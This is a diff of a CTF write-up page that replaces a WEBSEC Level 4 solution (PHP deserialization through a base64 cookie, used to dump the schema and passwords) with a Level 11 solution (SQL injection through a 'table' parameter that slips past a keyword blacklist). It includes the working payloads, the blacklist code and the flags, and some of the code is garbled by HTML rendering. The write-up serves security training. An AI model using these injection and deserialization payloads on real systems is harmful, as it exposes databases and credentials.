@@ -76,38 +76,58 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-11">WEBSEC Level 11</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
+<p>It's not AS simple AS it looks</p>
 <h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
+<p><code>$special1 = [&quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;'&quot;, &quot;*&quot;, &quot;+&quot;, &quot;-&quot;];     $special2 = [&quot;.&quot;, &quot;/&quot;, &quot;:&quot;, &quot;;&quot;, &quot;&lt;&quot;, &quot;=&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;@&quot;, &quot;[&quot;, &quot;\\&quot;, &quot;]&quot;];     $special3 = [&quot;^&quot;, &quot;_&quot;, &quot;&quot;, &quot;{&quot;, &quot;|&quot;, &quot;}&quot;]; <span class="math">$sql = [&quot;union&quot;, &quot;0&quot;, &quot;join&quot;, &quot;as&quot;];     $</span>blacklist = array_merge (<span class="math"><em>s</em><em>p</em><em>e</em><em>c</em><em>i</em><em>a</em><em>l</em>1, </span>special2, <span class="math"><em>s</em><em>p</em><em>e</em><em>c</em><em>i</em><em>a</em><em>l</em>3, </span>sql);</p>
+<p>if (isset (<span class="math">$_POST['submit']) &amp;&amp; isset ($</span><em>POST['user_id']) &amp;&amp; isset (<span class="math">$_POST['table'])) {     $</span>id = <span class="math"><em></em><sub><em>P</em></sub><em>O</em><em>S</em><em>T</em>[ʹ<em>u</em><em>s</em><em>e</em><em>r</em><sub><em>i</em></sub><em>d</em>ʹ]; </span>table = $</em>POST['table'];</p>
+sanitize($id, $table);
 
+$pdo = new SQLite3(&#39;database.db&#39;, SQLITE3_OPEN_READONLY);
+$query = &#39;SELECT id,username FROM &#39; . $table . &#39; WHERE id = &#39; . $id;
+//$query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id;
 
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
+$getUsers = $pdo-&gt;query($query);
+$users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC);
 
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
+$userDetails = false;
+if ($users) {
+    $userDetails = $users;
+$userDetails[&#39;table&#39;] = htmlentities($table);
+}
+<p>}`</p></code></pre>
+<h3 id="walk-through">Walk through</h3>
+<p>STEP 1: Intercept in burp</p>
+<p>STEP 2: <code>user_id=2&amp;table=costume&amp;submit=Submit+Query</code> OUTPUT: The hero number 2 in costume is Spiderman</p>
+<p>STEP 3: <code>id=2&amp;table=(select 2 id, enemy username from costume)&amp;submit=Submit+Query</code> OUTPUT: The hero number 2 in (select 2 id, enemy username from costume)</p>
 <h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><strong>FLAG</strong>: <code>WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
